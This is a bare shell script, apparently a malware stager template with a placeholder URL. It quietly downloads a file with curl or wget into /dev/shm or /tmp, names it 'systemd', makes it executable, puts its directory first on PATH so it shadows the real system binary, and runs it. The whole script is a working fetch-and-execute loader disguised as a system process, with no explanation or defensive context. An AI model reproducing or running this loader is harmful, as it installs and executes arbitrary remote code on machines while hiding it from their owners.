url='#URL#'

target="/tmp"
if [ -d "/dev/shm" ]; then
  target="/dev/shm"
fi

file="${target}/systemd"

if command -v curl &> /dev/null; then
  curl -o "${file}" "${url}" &> /dev/null
  if [ "$?" != "0" ]; then
    rm -f "${file}"
    exit 0
  fi
elif command -v wget &> /dev/null; then
  wget -O "${file}" "${url}" &> /dev/null
  if [ "$?" != "0" ]; then
    rm -f "${file}"
    exit 0
  fi
fi

chmod +x "${file}"
export PATH="${target}:${PATH}"
systemd --user
